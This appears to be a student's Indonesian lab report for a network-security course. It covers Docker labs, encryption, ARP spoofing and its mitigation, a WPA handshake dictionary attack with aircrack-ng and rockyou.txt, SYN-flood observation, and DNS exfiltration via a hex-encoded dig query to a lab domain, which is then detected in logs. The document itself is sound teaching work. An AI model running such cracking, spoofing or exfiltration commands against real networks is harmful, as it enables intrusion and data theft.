# Dokumentasi Praktikum Keamanan Jaringan – Kasus 2

Dokumen ini merangkum bukti terminal dari beberapa pertemuan praktikum berdasarkan screenshot yang dilampirkan. Screenshot disimpan di folder `images` dan ditampilkan langsung menggunakan tautan relatif agar dapat dibaca ketika folder ini dibuka melalui GitHub.

> **Catatan penting:** Dokumentasi Pertemuan 4 menggunakan hasil capture jaringan Wi-Fi milik pribadi, bukan file `.cap` yang disediakan dosen. Hasil pengujian Aircrack-ng adalah `KEY NOT FOUND`. Dokumentasi ini tidak menyatakan bahwa password berhasil ditemukan.

## Daftar isi

1. [Pertemuan 1 – Docker dan volume](#1-pertemuan-1--docker-dan-volume)
2. [Pertemuan 2 – Kriptografi](#2-pertemuan-2--kriptografi)
3. [Pertemuan 3 – ARP spoofing dan mitigasi](#3-pertemuan-3--arp-spoofing-dan-mitigasi)
4. [Pertemuan 4 – Analisis WPA/WPA2 handshake](#4-pertemuan-4--analisis-wpawpa2-handshake)
5. [Pertemuan 5 – ICMP dengan Scapy](#5-pertemuan-5--icmp-dengan-scapy)
6. [Pertemuan 6 – SYN flood dan three-way handshake](#6-pertemuan-6--syn-flood-dan-three-way-handshake)
7. [Pertemuan 7 – DNS exfiltration](#7-pertemuan-7--dns-exfiltration)
8. [Ringkasan hasil](#8-ringkasan-hasil)

---

## 1. Pertemuan 1 – Docker dan volume

### 1.1 Membuat volume dan menulis file

Perintah pada screenshot membuat Docker volume bernama `vol-k2`, menjalankan container Alpine untuk menulis isi file ke `/data/laporan-k2.txt`, kemudian menghapus container sementara.

```bash
docker volume create vol-k2
docker run --name w-k2 -v vol-k2:/data alpine sh -c 'echo 24552011129 > /data/laporan-k2.txt'
docker rm w-k2
```

### 1.2 Memeriksa data yang tersimpan

Container Alpine dijalankan kembali dengan volume yang sama. Isi file tetap dapat dibaca meskipun container pertama telah dihapus.

```bash
docker run --rm -v vol-k2:/data alpine cat /data/laporan-k2.txt
```

Output pada screenshot:

```text
24552011129
```

Hal ini memperlihatkan bahwa data berada pada Docker volume, bukan hanya pada lapisan filesystem container yang sebelumnya digunakan.

![Bukti pembuatan Docker volume dan file](Dokumentasi-Kasus-2/Pertemuan1/Screenshot_2026-11-13_03_50_52.png)

### 1.3 Menguji layanan Nginx

Screenshot berikut memperlihatkan perintah `wget` dari service `attacker` ke alamat `http://target` pada Compose project `k2`. Respons yang diterima adalah halaman HTML bawaan Nginx dengan judul `Welcome to nginx!`.

```bash
docker compose -p k2 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
```

Output halaman Nginx menunjukkan bahwa layanan web pada container target dapat dijangkau dari container attacker di lingkungan lab.

(Dokumentasi-Kasus-2/Pertemuan1/Screenshot_2026-11-13_03_54_58.png)

---

## 2. Pertemuan 2 – Kriptografi

### 2.1 Enkripsi dan dekripsi AES-256-CBC

Screenshot menunjukkan proses pembuatan file teks, enkripsi menggunakan AES-256-CBC dengan PBKDF2, kemudian dekripsi kembali ke file hasil.

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c \
'echo isi laporan k2 > laporan-k2.txt &&
 openssl enc -aes-256-cbc -pbkdf2 -salt \
 -in laporan-k2.txt -out laporan-k2.enc -pass pass:kunci-k2-2026 &&
 sha256sum laporan-k2.txt &&
 openssl enc -d -aes-256-cbc -pbkdf2 \
 -in laporan-k2.enc -out hasil-k2.txt -pass pass:kunci-k2-2026 &&
 sha256sum hasil-k2.txt'
```

Kedua hash SHA-256 yang terlihat pada screenshot sama:

```text
752b81872b283c3c0e6f65245b7f2c508034847a89049dc4312dbb75366a4c23
```

Kesamaan hash menunjukkan bahwa isi file hasil dekripsi sama dengan isi file asli pada pengujian tersebut.

### 2.2 Membuat sertifikat dengan Common Name

Screenshot juga memperlihatkan pembuatan sertifikat self-signed RSA 2048-bit dengan masa berlaku 30 hari. Common Name yang digunakan adalah `k2.exfil.lab`.

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c \
'openssl req -x509 -newkey rsa:2048 -nodes \
 -keyout key-k2.pem -out cert-k2.pem -days 30 \
 -subj /CN=k2.exfil.lab &&
 openssl x509 -in cert-k2.pem -noout -subject -issuer -dates'
```

Informasi sertifikat yang terlihat:

```text
subject=CN=k2.exfil.lab
issuer=CN=k2.exfil.lab
```

Karena sertifikat dibuat secara self-signed, nilai subject dan issuer sama. Screenshot juga memperlihatkan waktu mulai dan berakhir masa berlaku sertifikat.

![Bukti hash SHA-256 dan pembuatan sertifikat](Dokumentasi-Kasus-2/Pertemuan2/pertemuan-2-hash-dan-sertifikat.png)

**Catatan keamanan:** Jangan mengunggah `key-k2.pem` ke repositori publik. File tersebut merupakan private key. Simpan hanya di lingkungan lokal yang aman.

---

## 3. Pertemuan 3 – ARP spoofing dan mitigasi

### 3.1 Menyiapkan jaringan lab

Screenshot memperlihatkan pembuatan jaringan Docker `lab-arp-k2` dan tiga container yang terhubung ke jaringan tersebut:

- `korban-k2`
- `gateway-k2`
- `penyerang-k2`

Perintah inspeksi alamat IP yang berhasil dijalankan:

```bash
docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k2").IPAddress}}' korban-k2 gateway-k2
```

Alamat yang ditampilkan:

```text
172.19.0.2
172.19.0.3
```

### 3.2 Mengamati tabel ARP

Sebelum simulasi, tabel ARP pada container korban memperlihatkan alamat gateway `172.19.0.3` dengan MAC address gateway.

Kemudian, pada screenshot terlihat perintah `arpspoof` dijalankan dari container penyerang terhadap komunikasi antara korban dan gateway. Setelah itu, tabel ARP korban memperlihatkan alamat gateway dipetakan ke MAC address penyerang.

### 3.3 Mitigasi menggunakan static ARP

Screenshot terakhir pada bagian ini menunjukkan perintah untuk mengembalikan pemetaan ARP korban ke MAC address gateway yang benar:

```bash
docker exec korban-k2 arp -s 172.19.0.3 \
"$(docker exec gateway-k2 cat /sys/class/net/eth0/address)"
```

Setelah perintah tersebut dijalankan, tabel ARP kembali menunjukkan MAC address gateway yang benar untuk alamat `172.19.0.3`.

Dengan demikian, screenshot mendokumentasikan perubahan pemetaan ARP selama simulasi dan pemulihan pemetaan melalui static ARP.

![Bukti tahap awal simulasi ARP](Dokumentasi-Kasus-2/Pertemuan3/pertemuan-3-arp-awal.png)

![Bukti pemulihan pemetaan ARP](Dokumentasi-Kasus-2/Pertemuan3/pertemuan-3-arp-mitigasi.png)

---

## 4. Pertemuan 4 – Analisis WPA/WPA2 handshake

### 4.1 Sumber file capture

Pada pertemuan ini, pengujian dilakukan menggunakan file capture jaringan Wi-Fi milik pribadi. Pengujian **tidak menggunakan file `.cap` yang disediakan dosen**.

File yang terlihat pada terminal adalah:

```text
capture-05.cap
```

Perintah analisis yang terlihat pada screenshot:

```bash
aircrack-ng capture-05.cap -w /usr/share/wordlists/rockyou.txt
```

Aircrack-ng membaca file capture dan menampilkan satu target jaringan dengan informasi berikut:

- BSSID: `34:4A:1B:17:18:78`
- ESSID: `BPK.H UUN`
- Enkripsi: `WPA (1 handshake)`
- Jumlah paket yang dibaca: `4758`

Informasi `WPA (1 handshake)` menunjukkan bahwa Aircrack-ng mendeteksi satu handshake pada file capture tersebut.

### 4.2 Hasil pengujian

Pada akhir proses, Aircrack-ng menampilkan:

```text
KEY NOT FOUND
```

Screenshot juga memperlihatkan proses pengujian wordlist telah mencapai sekitar 100% dengan lebih dari 14 juta kandidat yang diuji. Namun, tidak ada kandidat password yang cocok dengan data autentikasi pada capture.

### 4.3 Analisis hasil

Hasil `KEY NOT FOUND` berarti password tidak ditemukan menggunakan kandidat yang tersedia pada wordlist dalam pengujian ini. Hasil tersebut **tidak membuktikan bahwa password tidak ada**, dan tidak berarti WPA/WPA2 berhasil dibobol.

Karena Aircrack-ng menampilkan `WPA (1 handshake)`, terdapat indikasi bahwa file capture memuat satu handshake yang dikenali oleh alat tersebut. Akan tetapi, pencarian password tetap bergantung pada kecocokan password dengan kandidat di wordlist.

### 4.4 Kesimpulan Pertemuan 4

Pengujian analisis WPA/WPA2 dilakukan terhadap capture dari jaringan pribadi. Aircrack-ng mengenali satu handshake, tetapi pencarian menggunakan wordlist `rockyou.txt` berakhir dengan `KEY NOT FOUND`.

Dengan demikian, hasil praktikum yang dilaporkan adalah **handshake terdeteksi, tetapi password tidak berhasil ditemukan menggunakan wordlist yang diuji**.

![Bukti analisis capture pribadi dengan hasil KEY NOT FOUND](Dokumentasi-Kasus-2/Pertemuan4/pertemuan-4-aircrack-key-not-found.png)

---

## 5. Pertemuan 5 – ICMP dengan Scapy

Screenshot memperlihatkan eksekusi program Python `kirim_icmp.py` dari dalam container `uts-kali-tools`. Program mengirim paket ICMP ke alamat `172.19.0.2`.

Perintah yang terlihat:

```bash
docker run --rm --network lab-arp-k2 \
-v "$PWD/kasus/k5-scapy:/work" \
uts-kali-tools python3 /work/kirim_icmp.py 172.19.0.2
```

Output yang terlihat:

```text
Mengirim: IP / ICMP 172.19.0.5 > 172.19.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```

Tipe ICMP balasan `0` merupakan Echo Reply. Nilai TTL balasan yang terlihat adalah `64`. Berdasarkan output tersebut, pengiriman ICMP dan penerimaan balasan berhasil pada pengujian yang ditampilkan.

![Bukti pengiriman ICMP menggunakan Scapy](Dokumentasi-Kasus-2/Pertemuan5/pertemuan-5-icmp-scapy.png)


---

## 6. Pertemuan 6 – SYN flood dan three-way handshake

### 6.1 Memeriksa koneksi pada target

Screenshot memperlihatkan container `target` pada lab SYN flood sedang menjalankan layanan TCP pada port `80`. Pemeriksaan menggunakan `netstat` difokuskan pada koneksi dengan status `SYN_RECV`.

Perintah yang terlihat:

```bash
docker compose -p k2 -f b/b3-syn-flood/docker-compose.yml \
exec target netstat -ant | grep -c SYN_RECV
```

Pada beberapa percobaan, jumlah koneksi `SYN_RECV` yang ditampilkan adalah `0`. Screenshot juga memperlihatkan pemeriksaan daftar koneksi aktif pada target:

```bash
docker compose -p k2 -f b/b3-syn-flood/docker-compose.yml \
exec target netstat -ant
```

Pada output tersebut, layanan TCP terlihat dalam keadaan `LISTEN`, termasuk pada alamat `0.0.0.0:80`.

![Bukti pemeriksaan SYN_RECV dan port listening](Dokumentasi-Kasus-2/Pertemuan6/pertemuan-6-syn-flood-netstat.png)

### 6.2 Memastikan tools pada container attacker

Screenshot memperlihatkan pemeriksaan ketersediaan `hping3`, `tcpdump`, dan `curl` pada container `attacker`:

```bash
docker compose -p k2 -f b/b3-syn-flood/docker-compose.yml \
exec attacker sh -c 'command -v hping3; command -v tcpdump; command -v curl'
```

Output menunjukkan ketiga utilitas tersedia:

```text
/usr/sbin/hping3
/usr/bin/tcpdump
/usr/bin/curl
```

### 6.3 Mengamati three-way handshake dengan tcpdump

Pada screenshot berikutnya, `tcpdump` dijalankan pada interface `eth0` untuk memantau trafik TCP port `80` sambil melakukan akses HTTP menggunakan `curl`:

```bash
docker compose -p k2 -f b/b3-syn-flood/docker-compose.yml \
exec attacker sh -c \
'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 2'
```

Output `tcpdump` memperlihatkan urutan paket TCP:

- `Flags [S]` — SYN dari `172.20.0.2:46412` menuju `172.20.0.3:80`
- `Flags [S.]` — SYN-ACK dari target menuju attacker
- `Flags [.]` — ACK dari attacker menuju target
- Setelah koneksi terbentuk, terlihat paket `HTTP` dan respons `HTTP/1.1 200 OK`.
- Di akhir koneksi terlihat paket `FIN`/`ACK` untuk penutupan koneksi TCP.

Urutan SYN → SYN-ACK → ACK pada screenshot menjadi bukti visual proses **three-way handshake** sebelum pertukaran data HTTP.

![Bukti three-way handshake dan trafik HTTP dari tcpdump](Dokumentasi-Kasus-2/Pertemuan6/pertemuan-6-three-way-handshake-tcpdump.png)

---

## 7. Pertemuan 7 – DNS exfiltration

### 7.1 Menjalankan DNS lab

Screenshot memperlihatkan service DNS pada lab `b/b4-dns-exfil` berhasil dijalankan bersama container `attacker`:

```bash
docker compose -p k2 -f b/b4-dns-exfil/docker-compose.yml up -d
```

Status container yang terlihat adalah:

```text
Container k2-attacker-1  Running
Container k2-dns-1       Running
```

### 7.2 Membuat label DNS berisi data

Screenshot menunjukkan pembuatan data uji menggunakan nilai:

```text
24552011129
```

Nilai tersebut kemudian dikonversi ke representasi hex dengan `xxd -p` dan digunakan sebagai bagian label domain DNS.

Query yang terlihat pada screenshot menggunakan format:

```bash
docker compose -p k2 -f b/b4-dns-exfil/docker-compose.yml \
exec attacker dig +short 323435353332303131313239.k2.exfil.lab @dns
```

Respons DNS yang ditampilkan:

```text
10.0.0.99
```

Hal ini menunjukkan query dengan label panjang tersebut diterima oleh service DNS lab.

### 7.3 Mengambil dan menganalisis log DNS

Log DNS kemudian disimpan ke file:

```bash
docker compose -p k2 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k2.log
```

Analisis dilakukan menggunakan:

```bash
python3 kasus/k9-dns-detect/analisis_dns.py dns-k2.log
```

Output analisis pada screenshot menunjukkan:

```text
Jumlah query per domain induk:
  exfil.lab: 2

Query mencurigakan (label panjang berisi hex):
  panjang=22  323435353332303131313239.k2.exfil.lab
  panjang=22  323435353332303131313239.k2.exfil.lab
```

Nilai hex tersebut kemudian didekode menggunakan:

```bash
echo 323435353332303131313239 | xxd -r -p
```

Hasil yang terlihat:

```text
24552011129
```

Dengan demikian, screenshot mendokumentasikan alur pengiriman data uji melalui label subdomain, pencatatan query pada log DNS, deteksi label panjang yang mengandung karakter hex, dan decoding kembali menjadi nilai awal.

![Bukti DNS exfiltration dan hasil decoding](Dokumentasi-Kasus-2/Pertemuan7/pertemuan-7-dns-exfiltration.png)

---

---

## 8. Ringkasan hasil

| Pertemuan | Aktivitas yang terlihat | Hasil berdasarkan screenshot |
|---|---|---|
| 1 | Docker volume dan akses Nginx | File tetap tersedia pada volume setelah container pertama dihapus; halaman Nginx berhasil diakses |
| 2 | Enkripsi/dekripsi dan sertifikat | Hash file asli dan hasil dekripsi sama; sertifikat memiliki CN `k2.exfil.lab` |
| 3 | Simulasi ARP dan mitigasi | Pemetaan ARP berubah selama simulasi dan dikembalikan ke MAC gateway |
| 4 | Analisis WPA/WPA2 | Satu handshake dikenali; hasil pencarian wordlist `KEY NOT FOUND` |
| 5 | Pengiriman ICMP dengan Scapy | Echo Reply diterima dengan TTL 64 dan tipe ICMP 0 |
| 6 | SYN flood dan three-way handshake | Port 80 terlihat listening; tcpdump memperlihatkan urutan SYN, SYN-ACK, dan ACK serta trafik HTTP |
| 7 | DNS exfiltration | Query dengan label hex panjang terdeteksi pada log dan didekode kembali menjadi data uji |

## Catatan sebelum mengunggah ke GitHub

1. Pastikan folder `images` ikut diunggah bersama file `README.md`. Jika hanya README yang diunggah, gambar tidak akan tampil.
2. Jangan mengunggah private key seperti `key-k2.pem`.
3. Periksa screenshot sebelum dipublikasikan. Screenshot dapat memuat identitas jaringan, alamat MAC, SSID, alamat IP, atau informasi pribadi. Samarkan bagian yang tidak ingin dibagikan.
4. Untuk Pertemuan 4, jelaskan bahwa capture berasal dari jaringan pribadi dan hasilnya `KEY NOT FOUND`. Jangan mengubah laporan menjadi klaim bahwa password berhasil ditemukan.
